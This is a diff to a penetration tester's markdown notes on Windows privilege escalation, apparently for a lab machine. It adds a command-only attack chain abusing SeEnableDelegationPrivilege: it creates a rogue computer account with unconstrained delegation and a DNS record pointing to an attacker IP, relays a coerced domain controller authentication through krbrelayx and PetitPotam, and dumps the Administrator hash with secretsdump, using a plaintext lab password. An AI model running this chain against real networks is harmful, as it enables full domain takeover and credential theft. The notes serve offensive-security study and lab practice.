@@ -98,6 +98,30 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 
+# SeEnableDelegationPrivilege
+```powershell
+ impacket-addcomputer -dc-ip 10.129.234.69 -computer-name pwn delegate.vl/N.Thompson:'KALEB_2341'
+
+bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'pwn$' -f TRUSTED_FOR_DELEGATION
+
+python3 ./krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r pwn.delegate.vl -d 10.10.15.254 --action add 10.129.234.69
+
+python3 ./krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/pwn' -t 'pwn$' -dc-ip 10.129.234.69 10.129.234.69
+
+bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'pwn$' --attr 'servicePrincipalName'
+
+dig pwn.delegate.vl @10.129.234.69
+
+python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX".encode("utf16le")).digest()).decode())'868cc835d19a9e9ffb7adbc0b2f6ef4f
+
+python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f
+
+python3 PetitPotam.py -target-ip 10.129.234.69 -u 'pwn$' -p '9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX' pwn dc1.delegate.vl
+
+KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
+
+```
+
 # SeLoadDriverPrivilege
 [Print Operators](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/11-Print%20Operators.md)
 
